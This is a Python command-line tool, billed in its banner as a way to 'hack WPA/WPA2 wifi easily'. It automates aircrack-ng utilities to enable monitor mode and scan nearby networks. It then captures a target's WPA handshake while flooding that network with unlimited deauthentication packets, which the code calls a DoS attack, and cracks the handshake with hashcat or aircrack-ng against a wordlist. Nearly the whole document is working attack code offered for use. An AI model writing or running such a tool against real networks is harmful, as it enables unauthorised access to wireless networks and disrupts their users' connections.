import subprocess
from threading import Thread

#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green = "\033[38;5;28m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"

art = print(Fiuscha+'''
            
     .... NO! ...                  ... MNO! ...
   ..... MNO!! ...................... MNNOO! ...
 ..... MMNO! ......................... MNNOO!! .
.... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .
 ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....
    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...
   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....
   ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...  
    ....... MMMMM..    OPPMMP    .,OMI! ....
     ...... MMMM::   o.,OPMP,.o   ::I!! ...
         .... NNM:::.,,OOPM!P,.::::!! ....
          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....
         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....
           .. MMMMMNNOOMMNNIIIPPPOO!! ......
          ...... MMMONNMMNNNIIIOO!..........
       ....... MN MOMMMNNNIIIIIO! OO ..........
    ......... MNO! IiiiiiiiiiiiI OOOO ...........
  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........
   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........
   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........
      ...... OO! ................. ON! .......
         ................................
''')

bname = print(green+'''
████████▄     ▄████████    ▄████████    ▄█   ▄█▄       
███   ▀███   ███    ███   ███    ███   ███ ▄███▀       
███    ███   ███    ███   ███    ███   ███▐██▀         
███    ███   ███    ███  ▄███▄▄▄▄██▀  ▄█████▀          
███    ███ ▀███████████ ▀▀███▀▀▀▀▀   ▀▀█████▄          
███    ███   ███    ███ ▀███████████   ███▐██▄         
███   ▄███   ███    ███   ███    ███   ███ ▀███▄       
████████▀    ███    █▀    ███    ███   ███   ▀█▀       
                          ███    ███   ▀               
   ▄████████    ▄█   ▄█▄ ███    █▄   ▄█        ▄█      
  ███    ███   ███ ▄███▀ ███    ███ ███       ███      
  ███    █▀    ███▐██▀   ███    ███ ███       ███      
  ███         ▄█████▀    ███    ███ ███       ███      
▀███████████ ▀▀█████▄    ███    ███ ███       ███      
         ███   ███▐██▄   ███    ███ ███       ███      
   ▄█    ███   ███ ▀███▄ ███    ███ ███▌    ▄ ███▌    ▄
 ▄████████▀    ███   ▀█▀ ████████▀  █████▄▄██ █████▄▄██
               ▀                    ▀         ▀        
v1.2    
This tool helps you to hack WPA/WPA2 wifi easily:)   
Buy me a coffee...
Copyright: @ALHARAM                                        
''')

#main 
def main():
    while True:
        art, bname
        
        print(white+"[1] Monitor mode.")
        print(white+"[2] Scan the networks in the area.")
        print(white+"[3] Get a handshake file of the network.")
        print(white+"[4] Crack a handshake file.")
        print(white+"[5] Exit.")
        choice = input(white+"\nChoose a number: ")
        if choice == '1':
            monitor_mode()
        elif choice == '2':
            scan_area()
        elif choice == '3':
            get_handshake()
        elif choice == '4':
            crack()
        elif choice == '5':
            print(red+"[*] Exiting....")
            break
        else:
            print(red+"[x] Invalid choice, please try again.")

#monitor mode 
def monitor_mode():
    try:
        subprocess.run(["airmon-ng", "start", "wlan0"], check=True)
        print(green+"[+] Monitor mode enabled successfully....")
    except subprocess.CalledProcessError as e:
        print(red+"[-] Failed to enable monitor mode:", e)

#scan area
def scan_area():
    try:
        subprocess.run(["airodump-ng", "wlan0mon"], check=True)
        print(green+"[+] Scanning area...")
    except subprocess.CalledProcessError as e:
        print(red+"[+] Failed to scan the area:", e)    
    
#handshake & dos attack
def get_handshake():
    bssid = input("Enter the network bssid: ")
    channel = input("Enter the network channel number: ")
    name = input("Enter the network name: ")
    try:
        def airodump():
            subprocess.Popen(["airodump-ng", "-c", channel, "-w", name, "--bssid", bssid, "wlan0mon"])
        def start_aireplay():
            subprocess.run([f'xterm -e "aireplay-ng --deauth 0 -a {bssid} wlan0mon"'], check=True, shell=True)
        airodump_thread = Thread(target=airodump)
        aireplay_thread = Thread(target=start_aireplay)
        print(green+"[+] Handshake capture started on channel", {channel},"for BSSID", {bssid})
        print(green+"[+] Starting dos attack on", {name}, "network....")
        airodump_thread.start()
        aireplay_thread.start()     
        airodump_thread.join()
        aireplay_thread.join()

    except subprocess.CalledProcessError as e:
        print(red+'[-] Failed to attack the', {name}, 'network:', e)    
#crack with gpu
import subprocess

def crack():
    method = input("Do you want to crack the handshake with GPU or CPU? (g/c): ").strip()  # Added parentheses for strip()
    handshake_file = input("Enter the path of the handshake file: ")
    wordlist = input("Enter the path of your wordlist: ")

    try:
        if method == 'g':
            subprocess.run(["hcxpcapngtool", "-o", "hashfile.hccapx", handshake_file], check=True)
            print(green+"[+] The handshake file changed into hashfile.hccapx successfully...")
            subprocess.run(["hashcat", "-m", "22000", "-a", "0", "-w", "3", "-o", "found.txt", "hashfile.hccapx", wordlist], check=True)
            print(green+"[+] Start cracking the handshake file...")
        elif method == 'c':
            bssid = input("Enter the network bssid: ")
            subprocess.run(["aircrack-ng", "-w", wordlist, handshake_file, "-b", bssid], check=True)
    except subprocess.CalledProcessError as e:
        print(red+"[-] Failed to crack the handshake file:", e)

# Example usage
# crack()

if __name__=='__main__':
    try:
        main()
    except KeyboardInterrupt:
        try:
            main()
        except KeyboardInterrupt:
            print(red+"\n[!] Interrupted by Ctrl+C. Exiting....\n")   
        
        
